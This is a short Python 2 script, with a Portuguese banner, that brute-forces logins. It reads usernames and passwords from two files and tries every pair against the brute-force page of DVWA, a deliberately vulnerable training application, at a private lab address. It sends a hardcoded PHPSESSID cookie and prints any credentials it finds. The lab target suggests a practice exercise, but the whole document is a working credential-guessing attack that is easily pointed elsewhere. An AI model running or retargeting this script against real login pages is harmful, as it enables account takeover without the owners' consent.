#!/usr/bin/python

import urllib2

print "HTTP BRUTE FORCE"
print "PARA PAGINAS WEB COM COOKIE PHPSESSID"

fuser = open('users.txt')
usuarios = fuser.read().split('\n')

fpass = open('pass.txt')
senhas = fpass.read().split('\n')

for luser in usuarios:
	for lpass in senhas:
		print "Testing...%s : %s"%(luser,lpass)
		url = "http://172.16.1.5/dvwa/vulnerabilities/brute/?username=%s&password=%s&Login=Login"%(luser,lpass)
		request = urllib2.Request(url)
		request.add_header('Cookie','security=high; PHPSESSID=db6aa30cd165f01acc777ec1b52d643b')
		response = urllib2.urlopen(request)
		result = response.read()
		if "Username and/or password incorrect." not in result:
			print "[+] Login and Pass Found >>>>>>>> %s:%s"%(luser,lpass)
			break

